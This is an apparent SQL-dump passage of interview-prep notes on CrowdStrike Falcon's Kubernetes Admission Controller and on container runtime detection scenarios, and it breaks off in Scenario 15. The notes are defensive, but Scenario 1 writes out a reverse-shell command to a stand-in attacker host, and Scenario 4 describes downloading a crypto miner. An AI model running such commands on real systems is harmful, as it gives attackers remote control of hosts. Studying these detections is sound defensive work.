- [Cloud_Security_Mastery_Playbook.md](./Cloud_Security_Mastery_Playbook.md)
- [Comprehensive_CNAPP_Guide.md](./Comprehensive_CNAPP_Guide.md)
- [Falcon_CSPM_IOM_Terraform_Guide.md](./Falcon_CSPM_IOM_Terraform_Guide.md)
- [Financial_Compliance_Frameworks.md](./Financial_Compliance_Frameworks.md)
- [KAC_and_Runtime_Detections_Guide.md](./KAC_and_Runtime_Detections_Guide.md)
- [Answers_Section1_IAM.md](./AWS_Security_QA/Answers_Section1_IAM.md)
- [Answers_Section2_Network_Section3_S3.md](./AWS_Security_QA/Answers_Section2_Network_Section3_S3.md)
- [Answers_Section4_Encryption_Section5_Logging.md](./AWS_Security_QA/Answers_Section4_Encryption_Section5_Logging.md)
- [Answers_Section6_Compute_Section7_AppSec.md](./AWS_Security_QA/Answers_Section6_Compute_Section7_AppSec.md)
- [Answers_Section8_Compliance_Section9_Grilling.md](./AWS_Security_QA/Answers_Section8_Compliance_Section9_Grilling.md)
- [Prisma_Cloud_CSPM_Interview_QA.md](./CNAPP_CSPM_Platforms/Prisma_Cloud_CSPM_Interview_QA.md)
- [Wiz_CSPM_Interview_QA.md](./CNAPP_CSPM_Platforms/Wiz_CSPM_Interview_QA.md)
- [DAZN_Cloud_Security_Engineer_Interview_Guide.md](./DAZN_Prep/DAZN_Cloud_Security_Engineer_Interview_Guide.md)
- [DAZN_Quick_Reference_Cheatsheet.md](./DAZN_Prep/DAZN_Quick_Reference_Cheatsheet.md)
- [DAZN_Self_Introduction.md](./DAZN_Prep/DAZN_Self_Introduction.md)
- [EY_Cloud_Security_Interview_Prep.md](./EY_Prep/EY_Cloud_Security_Interview_Prep.md)
- [EY_CNAPP_Self_Intro.md](./EY_Prep/EY_CNAPP_Self_Intro.md)$VELSEC$, '2026-06-05')
ON CONFLICT (id) DO UPDATE SET
  title = EXCLUDED.title,
  category = EXCLUDED.category,
  tags = EXCLUDED.tags,
  content = EXCLUDED.content,
  last_updated = EXCLUDED.last_updated;

INSERT INTO public.notes (id, title, category, tags, content, last_updated)
VALUES ($VELSEC$KAC_and_Runtime_Detections_Guide$VELSEC$, $VELSEC$Kac And Runtime Detections Guide$VELSEC$, $VELSEC$Security Engineer$VELSEC$, ARRAY['Cloud_Security']::TEXT[], $VELSEC$# 🛡️ Falcon KAC Deep Dive & Runtime Detection Scenarios Guide
### Interview-Ready | 15+ Scenarios | CrowdStrike Falcon Cloud Security

---

## Table of Contents

1. [KAC — How It Works (Architecture)](#1-kac--how-it-works)
2. [KAC — Detection Types & Use Cases](#2-kac--detection-types--use-cases)
3. [KAC — Scenario-Based Interview Questions](#3-kac--scenario-based-interview-questions)
4. [Runtime Detections — 15 Scenarios](#4-runtime-detections--15-scenarios)

---

## 1. KAC — How It Works

### What Problem Does KAC Solve?

Kubernetes makes deployment fast, but **misconfigurations happen constantly**:
- Developers deploy privileged containers by accident
- Images with critical CVEs run in production
- Secrets end up in pod specs
- Containers run as root with host network access

The **Falcon Kubernetes Admission Controller (KAC)** acts as a **security gatekeeper** — it intercepts every request to the K8s API server and decides: **Allow, Alert, or Block**.

### Where KAC Sits in the Request Lifecycle

```
 Developer runs: kubectl apply -f deployment.yaml
        │
        ▼
 ┌──────────────────────────────────┐
 │     K8s API Server               │
 │  1. Authentication (who are you?)│
 │  2. Authorization  (RBAC check)  │
 │  3. Admission Control ◄──────────┼──── KAC intercepts HERE
 │     ├─ Mutating webhooks         │
 │     └─ Validating webhooks ◄─────┼──── Falcon KAC = Validating Webhook
 │  4. Persist to etcd              │
 └──────────────────────────────────┘
        │
        ▼
 Pod is created (or BLOCKED by KAC)
```

**Key point:** KAC operates AFTER authentication and authorization but BEFORE the object is persisted. This means a misconfigured pod **never runs** — it's stopped at the gate.

### KAC Pod Architecture (3 Containers in 1 Pod)

```
┌─────────────────────────────────────────────────────────────┐
│                    KAC Pod (on worker node)                  │
│                                                             │
│  ┌─────────────────┐  ┌─────────────────┐  ┌─────────────┐ │
│  │  falcon-client   │  │   falcon-ac      │  │falcon-watcher│ │
│  │                 │  │                 │  │             │ │
│  │ Validating      │  │ Admission       │  │ Snapshot    │ │
│  │ Webhook         │  │ Controller      │  │ Monitor     │ │
│  │                 │  │                 │  │             │ │
│  │ • Listens to    │  │ • Policy mgmt   │  │ • Snapshots │ │
│  │   K8s API       │  │ • Cloud comms   │  │   K8s       │ │
│  │   events        │  │ • Event         │  │   objects   │ │
│  │ • Forwards to   │  │   handling      │  │ • Streams   │ │
│  │   falcon-ac     │  │ • Talks to      │  │   events to │ │
│  │                 │  │   CrowdStrike   │  │   CS cloud  │ │
│  │                 │  │   cloud         │  │             │ │
│  └─────────────────┘  └─────────────────┘  └─────────────┘ │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

| Container | Role | What It Does |
|-----------|------|-------------|
| **falcon-client** | Validating Webhook | Listens to K8s API server events. When a pod/deployment is created or updated, it intercepts the request and forwards it to `falcon-ac` for policy evaluation |
| **falcon-ac** | Admission Controller | The brain — evaluates the object against KAC policies and image assessment policies stored in the CrowdStrike cloud. Returns Allow/Deny decision |
| **falcon-watcher** | Continuous Monitor | Takes periodic snapshots of ALL K8s objects (pods, deployments, services). Streams create/update/delete events to CrowdStrike cloud as `K8SResource` events for continuous visibility |

### How a KAC Decision Happens (Step by Step)

```
1. Developer: kubectl apply -f pod.yaml
       │
       ▼
2. K8s API Server authenticates & authorizes the user
       │
       ▼
3. API Server sends AdmissionReview request to falcon-client webhook
       │
       ▼
4. falcon-client forwards the request to falcon-ac
       │
       ▼
5. falcon-ac evaluates against TWO policy types:
       │
       ├── A) Admission Control Policies (IOM rules)
       │       • Is the container privileged?
       │       • Is it running as root?
       │       • Does it have host network access?
       │       • Does it mount host paths?
       │       • Does it have excessive capabilities?
       │
       └── B) Image Assessment Policies
               • Has this image been scanned?
               • Does it have critical/high CVEs?
               • Does it have malware?
               • Does it have leaked credentials?
       │
       ▼
6. falcon-ac returns decision:
       • ALLOW   → Pod is created normally
       • ALERT   → Pod is created, but detection is raised in Falcon console
       • PREVENT → Pod creation is BLOCKED. kubectl returns error to user
```

### KAC Policy Configuration

**Navigate to:** `Cloud Security > Rules and Policies > Policies > Admission Control Policies`

**Policy Components:**

| Component | Purpose | Example |
|-----------|---------|---------|
| **Rule Groups** | Define which K8s resources the policy applies to | "All pods in production namespace" |
| **Host Groups** | Connect the policy to the KAC on specific clusters | Dynamic host group by K8s Cluster ID |
| **Namespaces** | Target specific virtual clusters | `production`, `staging` |
| **Pod/Service Labels** | Precise targeting of specific workloads | `app=payment-service` |
| **IOM Rules** | Set action per misconfiguration type | Privileged → Prevent, HostPath → Alert |
| **Image Assessment** | Act on image scan results | Unassessed images → Prevent |

### Why KAC is Critical (Interview Answer)

> "KAC is the **shift-left enforcement point** in Kubernetes security. Unlike runtime detection which catches problems after they happen, KAC **prevents** misconfigured workloads from ever reaching the runtime environment. It sits as a validating webhook in the K8s admission pipeline, evaluating every pod creation/update against two policy types: IOM rules (detecting misconfigurations like privileged containers) and image assessment policies (blocking images with vulnerabilities). The key architectural detail is that KAC runs 3 containers in one pod — the webhook interceptor, the policy engine that talks to CrowdStrike cloud, and a watcher that provides continuous inventory visibility. I recommend a phased rollout: start with Alert on all rules, monitor for 2-4 weeks, then switch critical rules to Prevent."

---

## 2. KAC — Detection Types & Use Cases

### KAC Detection Categories

#### A) Indicators of Misconfiguration (IOMs)

| IOM Detection | Risk Level | What It Detects | Why It Matters |
|---------------|-----------|-----------------|----------------|
| **Privileged Container** | 🔴 Critical | `securityContext.privileged: true` | Container has full host access — breakout is trivial |
| **Running as Root** | 🔴 Critical | `runAsUser: 0` or no `runAsNonRoot: true` | Root in container = root on host if breakout occurs |
| **Host Network Access** | 🔴 Critical | `hostNetwork: true` | Container shares host network — can sniff all node traffic |
| **Host PID Namespace** | 🔴 Critical | `hostPID: true` | Container can see and kill host processes |
| **Host IPC Namespace** | 🟠 High | `hostIPC: true` | Container can access host shared memory |
| **HostPath Volume Mount** | 🟠 High | Mounting `/`, `/etc`, `/var` from host | Direct access to host filesystem |
| **Excessive Capabilities** | 🟠 High | `CAP_SYS_ADMIN`, `CAP_NET_RAW`, etc. | Grants kernel-level powers to the container |
| **No Resource Limits** | 🟡 Medium | Missing `resources.limits` | Enables resource exhaustion (DoS) |
| **Writable Root Filesystem** | 🟡 Medium | `readOnlyRootFilesystem: false` | Allows attackers to write binaries/scripts |
| **Secrets in Environment** | 🟠 High | Secrets passed as plain env vars | Secrets visible in `kubectl describe pod` and process listings |

#### B) Image Assessment Detections

| Detection | What It Finds | Impact |
|-----------|---------------|--------|
| **Unassessed Image** | Image has never been scanned | Unknown vulnerabilities running in production |
| **Critical CVE in Image** | Known exploitable vulnerability (e.g., Log4Shell) | Active exploitation risk |
| **Malware in Image** | Known malicious binary in image layers | Compromised supply chain |
| **Credentials in Image** | AWS keys, Slack tokens, GCP creds in image | Credential theft from image scan |
| **SetUID Bit Found** | Binary with SetUID flag — privilege escalation vector | Attacker can escalate to root |
| **Running as Root in Dockerfile** | No `USER` instruction — defaults to root | Unnecessary privilege |
| **ADD Instruction** | `ADD` instead of `COPY` in Dockerfile | Can pull from remote URLs — injection risk |

#### C) KAC Compliance Detections

| Detection | Benchmark | Rule |
|-----------|-----------|------|
| **Container can acquire additional privileges** | CIS Docker 5.25 | Ensure `allowPrivilegeEscalation: false` |
| **Root group execution** | CIS K8s 5.2.6 | Ensure containers run with non-root group |
| **Missing seccomp profile** | CIS K8s 5.7.2 | Ensure Seccomp profile is set |
| **Missing AppArmor profile** | CIS K8s 5.7.1 | Ensure AppArmor profile is set |

### KAC Use Case: Real-World Workflow

**Scenario:** Your organization has 50 microservices on EKS. A developer pushes a new deployment with `privileged: true` because their monitoring tool "needs it."

**Without KAC:**
1. Pod deploys to production
2. Runs for days/weeks unnoticed
3. Attacker exploits application vulnerability → trivial container breakout
4. Full cluster compromise

**With KAC (Prevent Mode):**
1. Developer runs `kubectl apply`
2. KAC intercepts the AdmissionReview request
3. falcon-ac checks: `privileged: true` → rule set to **Prevent**
4. kubectl returns: `Error from server: admission webhook "falcon-kac" denied the request: privileged containers are not allowed`
5. Developer contacts security team
6. Security team identifies the specific capability needed (e.g., `CAP_NET_ADMIN`)
7. Pod is reconfigured with the minimum required capability, not full `privileged`
8. Deployment succeeds with least privilege

---

## 3. KAC — Scenario-Based Interview Questions

### Q1: "How would you roll out KAC policies in a production environment without causing outages?"

**Answer:**
> "I follow a **three-phase rollout strategy**:
> - **Phase 1 (Weeks 1-2): Monitor Only** — Deploy KAC with ALL rules set to **Alert**. No workloads are blocked. This creates a baseline of all current misconfigurations across the cluster.
> - **Phase 2 (Weeks 3-4): Selective Prevention** — Analyze the alert data. Identify misconfigurations that are clearly unintentional (e.g., no developer needs `hostPID: true`). Switch those rules to **Prevent**. Keep debatable rules on Alert.
> - **Phase 3 (Week 5+): Full Prevention** — Work with development teams to remediate remaining Alert findings. Switch critical rules (`privileged`, `running as root`, `host network`) to **Prevent**.
>
> The key is the dynamic host group — I create a group filtered by K8s Cluster ID. This lets me roll out policies per cluster, starting with staging before production."

---

### Q2: "A KAC policy is set to Prevent, and suddenly a critical production deployment fails. What do you do?"

**Answer:**
> "Immediate response is **business continuity first**:
> 1. **Identify the blocking rule** — check the Falcon console under Detections for the KAC alert. The detail panel shows exactly which IOM rule or image assessment policy blocked the deployment.
> 2. **Assess the risk** — is this a legitimate business-critical deployment? If yes, proceed to step 3.
> 3. **Temporary exemption** — I do NOT disable the entire policy. Instead, I create a **namespace-scoped exception** in the KAC policy rule group to allow this specific workload temporarily, or switch that specific rule to Alert for the affected namespace.
> 4. **Document and time-bound** — create a ticket with a 7-day deadline for the team to fix the underlying misconfiguration.
> 5. **Post-incident** — work with the dev team to remediate the root cause and remove the exception.
>
> I never globally disable prevention because one team's emergency. That would leave the entire cluster exposed."

---

### Q3: "How does KAC help with container supply chain security?"

**Answer:**
> "KAC integrates with Image Assessment Policies, which is the supply chain security layer:
> 1. **Pre-runtime scanning** — Images are scanned in the CI/CD pipeline or registry for CVEs, malware, credentials, and misconfigurations.
> 2. **Admission-time enforcement** — When a pod is created, KAC checks if the image has been assessed. If it's unassessed, I set the policy to **Prevent** — unknown images do not run.
> 3. **Vulnerability threshold** — I can configure KAC to block images with Critical or High CVEs, even if they've been scanned.
> 4. **Continuous reassessment** — Image Assessment at Runtime (IAR) continuously re-scans running images. If a new CVE is published that affects a running image, it appears in the console for remediation.
>
> This creates a closed-loop: nothing runs without scanning, nothing with critical vulnerabilities runs, and running images are continuously reassessed."

---

### Q4: "What's the difference between KAC and Pod Security Standards/OPA Gatekeeper?"

**Answer:**
> "They serve similar functions but with different strengths:
>
> | Feature | KAC | Pod Security Standards (PSA) | OPA/Gatekeeper |
> |---------|-----|----------------------------|----------------|
> | **Deployment** | CrowdStrike-managed, Helm install | Built into K8s 1.25+ | Self-managed policy engine |
> | **Policy management** | CrowdStrike cloud console | Namespace labels | Rego policy language |
> | **Image scanning** | ✅ Integrated image assessment | ❌ No image scanning | ❌ No image scanning |
> | **Continuous monitoring** | ✅ falcon-watcher streams state | ❌ Admission-time only | ❌ Admission-time only |
> | **Cloud visibility** | ✅ Centralized in Falcon console | ❌ Local cluster only | ❌ Local cluster only |
> | **MITRE ATT&CK mapping** | ✅ Tactic/technique for each IOM | ❌ | ❌ |
>
> In enterprise environments, I use KAC as the **primary enforcement** because it provides centralized visibility, image assessment integration, and MITRE mapping. I may use PSA as a **defense-in-depth layer** for clusters outside CrowdStrike coverage."

---

### Q5: "KAC detected a 'Secret' type misconfiguration. What does this mean and how do you investigate?"

**Answer:**
> "A 'Secret' type IOM means KAC found **sensitive information embedded directly in the K8s object spec** — this could be:
> - An API key in an environment variable (`env.value: sk-live-abc123...`)
> - A database password in a ConfigMap instead of a K8s Secret
> - An AWS access key hardcoded in the pod spec
>
> **Investigation:**
> 1. Check the IOM detail panel — it shows the exact field and value that triggered the detection.
> 2. Determine if the secret is valid — use the key/credential to check if it's active (e.g., `aws sts get-caller-identity` for AWS keys).
> 3. If valid: **rotate the credential immediately** — it's already been stored in `etcd`, K8s audit logs, and potentially SCM history.
> 4. Remediate: migrate the secret to K8s Secrets (encrypted at rest using KMS), or better yet, use an external secrets manager (HashiCorp Vault, AWS Secrets Manager) with a CSI driver.
> 5. Set the KAC rule for secrets to **Prevent** to block future occurrences."

---

## 4. Runtime Detections — 15 Scenarios

> Each scenario follows the format: **What Happened → Detection Signal → Investigation → Risk → Remediation → Interview Answer**

---

### Scenario 1: Reverse Shell from a Container

**What Happened:** An attacker exploited an RCE vulnerability in a web application running inside a K8s pod. They spawned a reverse shell back to their C2 server.

**Detection Signals:**
- **Falcon IOA:** `ReverseShellDetected` — outbound TCP connection from a shell process
- **Process Tree:** `node` → `sh` → `bash -i >& /dev/tcp/attacker-ip/4444 0>&1`
- **Drift Indicator:** `bash` not present in the original container image
- **Network:** Outbound connection to non-standard port (4444)

**Investigation:**
1. Open the detection → examine the **process tree** (parent→child chain)
2. Check **drift indicators** — was the shell binary in the original image?
3. Check the **network connection** details — destination IP, port, bytes transferred
4. Check if the attacker accessed the **service account token** at `/var/run/secrets/kubernetes.io/serviceaccount/token`
5. Check if the attacker queried the **IMDS** at `169.254.169.254`

**Risk:** Critical — interactive access to the container, potential K8s API access and credential theft.

**Remediation:** Kill the pod, patch the vulnerability, set `readOnlyRootFilesystem: true`, deploy default-deny NetworkPolicies, disable SA token automounting.

**Interview Answer:**
> "I detect reverse shells primarily through Falcon's process tree — a web server should never spawn `bash`. The drift indicator confirms the shell wasn't in the image. My immediate action is to kill the pod and apply a deny-all NetworkPolicy. Long-term, I enforce `readOnlyRootFilesystem` and default-deny egress."

---

### Scenario 2: Container Running as Root

**What Happened:** A pod was deployed without a `securityContext` — defaults to running as root (UID 0).

**Detection Signals:**
- **KAC IOM:** `RunningAsRootContainer` — `runAsUser: 0` or `runAsNonRoot` not set
- **Runtime Detection:** Process executions under UID 0 inside the container
- **Image Detection:** `UserInstructionNotInDockerfile`

**Investigation:**
1. Check the pod spec — is there a `securityContext` with `runAsNonRoot: true`?
2. Check the Dockerfile — does it have a `USER` instruction?
3. Determine if running as root is actually required (usually it isn't)

**Risk:** High — if the container is compromised, the attacker has root privileges, making breakout easier.

**Remediation:** Add `runAsNonRoot: true` and `runAsUser: 1000` to the pod/container securityContext. Add `USER nonroot` to the Dockerfile. Set KAC to **Prevent** for this IOM.

**Interview Answer:**
> "Running as root is one of the most common K8s misconfigurations. I enforce it at two layers: KAC prevents pods without `runAsNonRoot: true` from deploying, and our CI/CD pipeline rejects Dockerfiles without a `USER` instruction."

---

### Scenario 3: Privileged Container Breakout

**What Happened:** A pod with `privileged: true` was compromised. The attacker mounted the host filesystem and stole the Kubelet kubeconfig.

**Detection Signals:**
- **Falcon Runtime:** `PotentialKernelTampering` — `mount` syscall from within a container
- **Drift:** `mount`, `nsenter`, `chroot` executed inside the container
- **KAC IOM:** `Privileged Container` (if KAC was in Alert mode, not Prevent)
- **File Access:** Read of `/var/lib/kubelet/kubeconfig`

**Investigation:**
1. Process tree: What binary executed the `mount` syscall?
2. Drift indicators: Were tools like `mount`, `fdisk`, `nsenter` brought into the container?
3. File access: Did any process read Kubelet credentials?
4. K8s audit logs: Were cluster secrets accessed using those credentials?
5. **Assume full cluster compromise** if Kubelet creds were accessed.

**Risk:** Critical — single container → full cluster compromise → all secrets exposed.

**Remediation:** Kill the pod, cordon the node, rotate ALL cluster secrets, set KAC to **Prevent** for privileged containers, enforce Pod Security Standards `restricted` profile.

**Interview Answer:**
> "A privileged container breakout is the worst-case K8s scenario. When I see Falcon's `PotentialKernelTampering` alert showing a mount syscall from a container, I assume the node is compromised. Immediate actions: kill the pod, cordon+drain the node, rotate all cluster secrets. Prevention is key — KAC should never allow `privileged: true` in production."

---

### Scenario 4: Container Drift — Crypto Miner Downloaded

**What Happened:** An attacker exploited a vulnerability and used `curl` to download a crypto miner binary into the container. The container's CPU usage spiked to 100%.

**Detection Signals:**
- **Drift Indicator:** `curl` executed to download `/tmp/xmrig` — binary not in original image
- **Drift Indicator:** `/tmp/xmrig` executed — new binary launched
- **Falcon IOA:** `SuspiciousProcessExecution` — unknown binary with high CPU usage
- **Network:** Outbound connection to a mining pool IP (e.g., `pool.minexmr.com:4444`)

**Investigation:**
1. Check drift indicators — what was downloaded and from where?
2. Check the binary hash against VirusTotal / threat intelligence
3. Check network connections — mining pool domains/IPs
4. Check how the attacker got in (application vulnerability, exposed service)

**Risk:** High — resource theft + indicates the attacker has code execution.

**Remediation:** Kill the pod, patch the application, enforce `readOnlyRootFilesystem: true` (prevents writing to `/tmp`), enable drift prevention to auto-kill drifted processes, restrict egress with NetworkPolicies.

**Interview Answer:**
> "Crypto mining in containers is extremely common because containers often have unrestricted egress. Falcon's drift detection catches this immediately — `curl` downloading a binary that wasn't in the image. If drift prevention is enabled, Falcon kills `xmrig` the moment it executes. My prevention strategy: `readOnlyRootFilesystem`, default-deny egress NetworkPolicies, and drift prevention enabled."

---

### Scenario 5: Suspicious kubectl exec (Interactive Intrusion)

**What Happened:** An attacker compromised a developer's `kubeconfig` and used `kubectl exec` to get interactive shell access to a production pod.

**Detection Signals:**
- **K8s Audit Log:** `pods/exec` API call with unexpected service account or user
- **Falcon Runtime:** Interactive shell session detected — `sh`/`bash` spawned by container's entrypoint
- **Falcon IOA:** `InteractiveIntrusion` — mimics admin behavior
- **Network:** Internal connections from the pod to database services

**Investigation:**
1. Who authenticated? Check K8s audit logs for the `userIdentity` on the `exec` call
2. Where did the request originate? Check source IP — is it from a corporate network or an unknown IP?
3. What commands were run? Review Falcon's process tree for all commands in the interactive session
4. Was this expected? Contact the user/team — was there a planned debugging session?

**Risk:** High — attacker has live interactive access to a production workload.

**Remediation:** Terminate the `exec` session, rotate the compromised `kubeconfig`, restrict `pods/exec` RBAC to break-glass roles only, use K8s audit logging to alert on all `exec` events, consider using ephemeral debug containers instead.

**Interview Answer:**
> "Interactive intrusion is particularly dangerous because it mimics legitimate admin behavior. I detect it by alerting on all `pods/exec` calls via K8s audit logs and correlating with Falcon's interactive session detection. My policy: `pods/exec` is restricted to an emergency break-glass role, requires MFA, and triggers an automatic PagerDuty alert."

---

### Scenario 6: eBPF Program Loaded from Container

**What Happened:** An advanced attacker loaded a malicious eBPF program from inside a container to intercept network traffic or tamper with security monitoring.

**Detection Signals:**
- **Falcon IOA:** `PotentialKernelTampering` — eBPF invoked from within a container
- **Detection Description:** "The eBPF feature has been invoked from within a container. This is a highly unusual activity and can be used to load a kernel rootkit or manipulate kernel behavior affecting the entire host."

**Investigation:**
1. Which container triggered this? Check the detection's container context (ID, image, namespace)
2. What eBPF program was loaded? Check the process tree for `bpf()` syscall details
3. Was the container privileged? eBPF requires `CAP_SYS_ADMIN` or `CAP_BPF`
4. Is this a legitimate monitoring tool (e.g., Cilium, Falco) or unexpected?

**Risk:** Critical — eBPF can intercept syscalls, modify kernel behavior, and hide attacker activity from security tools.

**Remediation:** Kill the pod immediately, investigate the node for rootkits, drop `CAP_SYS_ADMIN` and `CAP_BPF` capabilities via KAC policy.

**Interview Answer:**
> "eBPF from inside a container is a critical-severity finding. Legitimate eBPF usage happens at the node level (Cilium, Falcon sensor itself), never from application containers. This indicates either a kernel rootkit attempt or a container breakout in progress. I immediately kill the container and investigate the node."

---

### Scenario 7: Lateral Movement — Pod to Internal Service

**What Happened:** A compromised pod scanned the internal K8s network and connected to a database service that it shouldn't have access to.

**Detection Signals:**
- **Falcon:** Port scanning activity from the pod (rapid connection attempts to many IPs/ports)
- **Falcon IOA:** `SuspiciousNetworkConnection` — connection to internal service not in pod's normal baseline
- **Network Policy Violation (if policies exist):** Blocked connections logged
- **K8s Audit Log:** Pod queried the K8s DNS for `service-name.namespace.svc.cluster.local`

**Investigation:**
1. What services were targeted? Check network connections from the pod
2. How did the attacker get the service addresses? K8s DNS resolves all services — no discovery needed
3. Was the connection successful? If no NetworkPolicies, the answer is likely yes
4. What data was accessed?

**Risk:** High — K8s flat networking means every pod can reach every service by default.

**Remediation:** Implement **default-deny NetworkPolicies** in every namespace, only allow specific pod-to-service communication, restrict K8s DNS access per namespace.

**Interview Answer:**
> "Lateral movement in K8s is trivial by default because the network is flat — every pod can talk to every service. This is why default-deny NetworkPolicies are my #1 K8s security recommendation. Falcon detects the scanning activity and anomalous connections, but the real fix is network segmentation."

---

### Scenario 8: Unidentified Container — Not Visible to K8s

**What Happened:** A container was launched directly via `docker run` on the worker node, bypassing the K8s orchestrator entirely.

**Detection Signals:**
- **Falcon:** Unidentified container — `Visible to K8s: No`
- **Falcon:** Container not associated with any pod, deployment, or namespace
- **Falcon:** Container image not in any approved registry

**Investigation:**
1. How was a container launched outside K8s? This indicates **the worker node itself is compromised**
2. What image is running? Is it from an approved registry?
3. Who has SSH/console access to the worker node?
4. Check the node for other indicators of compromise

**Risk:** Critical — node-level compromise. The K8s orchestrator has no visibility or control.

**Remediation:** Kill the container via `sudo docker kill <id>` using Falcon RTR, investigate the node for full compromise, rebuild the node from a golden AMI, disable SSH access to worker nodes.

**Interview Answer:**
> "An unidentified container not visible to K8s is a critical finding — it means either the worker node is compromised or someone accessed the node directly. I immediately kill the container via Falcon RTR, cordon the node, and trigger a full node investigation. Worker nodes should never have direct SSH access in production."

---

### Scenario 9: Rogue Container from Unauthorized Image Registry

**What Happened:** A pod was deployed using an image from Docker Hub instead of the organization's private ECR registry.

**Detection Signals:**
- **KAC IOM:** Image not from approved registry
- **Image Assessment:** Unassessed image — not in any approved scanning pipeline
- **Runtime Detection:** Container running with unknown image provenance

**Investigation:**
1. Who deployed this? Check K8s audit logs for the deployment creator
2. What image is it? Is it a known base image or something suspicious?
3. Was it deployed intentionally (developer shortcut) or maliciously (supply chain attack)?

**Risk:** High — unscanned images may contain vulnerabilities, malware, or backdoors.

**Remediation:** Set KAC to **Prevent** for unassessed images, restrict image pull policies to private registry only (`imagePullPolicy: Always` + registry restrictions via OPA), scan all images in CI/CD pipeline.

**Interview Answer:**
> "This is a supply chain security gap. I enforce registry restrictions at two levels: KAC blocks pods with unassessed images, and OPA/Gatekeeper policies ensure images can only be pulled from our private ECR registry. Any image from Docker Hub in production is either a developer shortcut or an attack."

---

### Scenario 10: Privilege Escalation via SUID Binary

**What Happened:** An attacker found a binary with the SetUID bit set inside a container and used it to escalate to root.

**Detection Signals:**
- **Image Detection:** `SetUIDBitFoundInImage` (pre-runtime)
- **Runtime IOA:** Process execution with escalated privileges
- **Process Tree:** Unprivileged user → SUID binary execution → root shell

**Investigation:**
1. Which binary has the SUID bit? Common targets: `find`, `nmap`, `vim`, `python`
2. Was this binary in the original image or downloaded (drift)?
3. What did the attacker do after escalation?

**Risk:** High — root access inside the container increases breakout risk.

**Remediation:** Remove unnecessary SUID bits from images (`RUN chmod u-s /usr/bin/...`), set `allowPrivilegeEscalation: false` in securityContext, use `no-new-privileges` security option.

**Interview Answer:**
> "SUID binaries are a classic Linux privilege escalation vector. In containers, I prevent this at three levels: image scanning flags SUID bits in CI/CD, `allowPrivilegeEscalation: false` blocks the kernel mechanism, and KAC enforces this policy at admission time."

---

### Scenario 11: Suspicious Outbound DNS — C2 Communication

**What Happened:** A compromised container is using DNS tunneling to exfiltrate data to a C2 server.

**Detection Signals:**
- **Falcon:** Unusual DNS query patterns — high volume of queries to a single unusual domain
- **Falcon IOA:** `SuspiciousDNSRequest` — query to known-bad domain
- **Network:** DNS queries with abnormally long subdomain labels (data encoded in DNS)

**Investigation:**
1. What domain is being queried? Check against threat intelligence
2. What is the query pattern? Legitimate DNS is infrequent; tunneling generates hundreds of queries per minute
3. What process is generating the DNS queries? Check process tree
4. Is the container acting as a DNS client to an external resolver or using cluster DNS?

**Risk:** High — data exfiltration via DNS bypasses most network controls.

**Remediation:** Restrict pod DNS to cluster DNS only (no direct external DNS), implement DNS monitoring/filtering, NetworkPolicies blocking UDP/53 to external IPs.

**Interview Answer:**
> "DNS tunneling is a sophisticated exfiltration technique because most firewalls allow DNS. Falcon detects it through anomalous DNS query patterns and known-bad domain matching. My prevention: pods should only use cluster DNS, external DNS resolution should go through a filtered resolver, and NetworkPolicies should block direct UDP/53 egress."

---

### Scenario 12: AWS Credentials Stolen from IMDS via Pod

**What Happened:** A pod on an EKS worker node queried the Instance Metadata Service (IMDS) at `169.254.169.254` and stole the node's IAM role credentials.

**Detection Signals:**
- **Falcon:** HTTP request to `169.254.169.254` from application process
- **GuardDuty:** `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS`
- **CloudTrail:** API calls from the node's instance role with source IP outside VPC CIDR

**Investigation:**
1. Which pod made the IMDS request? Check Falcon's container context
2. Was the pod supposed to have AWS access? If yes, it should use IRSA, not IMDS
3. Were the credentials used externally? Check CloudTrail for the role ARN

**Risk:** Critical — node-level IAM credentials are usually more permissive than pod-level IRSA roles.

**Remediation:** Enforce **IMDSv2** (`http-put-response-hop-limit: 1` prevents containers from reaching IMDS), deploy **IRSA** for pod-level IAM access, block `169.254.169.254` in pod NetworkPolicies.

**Interview Answer:**
> "This is why IRSA exists. If a pod needs AWS access, it should use IRSA with a scoped IAM role, not the node's instance profile. I enforce IMDSv2 with a hop-limit of 1, which prevents containers from reaching IMDS. Additionally, I add a NetworkPolicy explicitly blocking `169.254.169.254`."

---

### Scenario 13: ConfigMap/Secret Enumeration via K8s API

**What Happened:** A compromised pod used its auto-mounted service account token to list all secrets across all namespaces.

**Detection Signals:**
- **K8s Audit Log:** `get`/`list` on `secrets` resource across multiple namespaces from an unexpected service account
- **Falcon Runtime:** `curl` or `kubectl` spawned inside a container (drift)
- **Falcon IOA:** Reconnaissance activity — systematic API enumeration

**Investigation:**
1. What service account was used? Check the K8s audit log `userIdentity`
2. Does this SA have `list secrets` permission? (It shouldn't!)
3. What secrets were accessed? Check the response from the API
4. Were any secrets used subsequently (connection to a database, API call)?

**Risk:** Critical — K8s secrets contain database passwords, API keys, certificates.

**Remediation:** Set `automountServiceAccountToken: false` for all pods that don't need API access, apply least-privilege RBAC (no `get secrets` for application SAs), encrypt etcd at rest.

**Interview Answer:**
> "Service account token abuse is a major K8s attack vector. The default behavior of auto-mounting the SA token into every pod gives attackers a free API key. I set `automountServiceAccountToken: false` by default and only enable it for pods that genuinely need API access, with tightly scoped RBAC."

---

### Scenario 14: Container Escape via Docker Socket Mount

**What Happened:** A Pod was configured to mount the container runtime socket (`/var/run/docker.sock`). An attacker used it to create a new container with full host access.

**Detection Signals:**
- **KAC IOM:** HostPath volume mount of `/var/run/docker.sock` or `/var/run/containerd/containerd.sock`
- **Falcon Runtime:** New container creation detected outside K8s orchestrator
- **Falcon:** Unidentified container appeared (not managed by K8s)
- **Drift:** `docker` CLI or `ctr` executed inside the pod

**Investigation:**
1. Why was the runtime socket mounted? Common for CI/CD pods (Docker-in-Docker) or monitoring tools
2. What commands were executed against the socket?
3. Were new containers created? With what privileges?
4. Was the host filesystem mounted in the new container?

**Risk:** Critical — access to the runtime socket = ability to create privileged containers = full host compromise.

**Remediation:** Block `/var/run/docker.sock` and `/var/run/containerd/` mounts via KAC (HostPath Volume rule → Prevent), use alternatives for CI/CD (Kaniko for builds, no socket mounting), enforce this in OPA policies.

**Interview Answer:**
> "The container runtime socket is the keys to the kingdom. Anyone who can create containers on the node can create a privileged one and own the host. I absolutely block socket mounts via KAC policy. For CI/CD use cases like Docker-in-Docker, I use Kaniko which builds images without requiring a Docker daemon."

---

### Scenario 15: Falcon Sensor Coverage Gap — DaemonSet Not Running

**What Happened:** A new EKS node group was added to the cluster, but the Falcon sensor DaemonSet was not scheduled on the new nodes due to a taint/toleration mismatch.

**Detection Signals:**
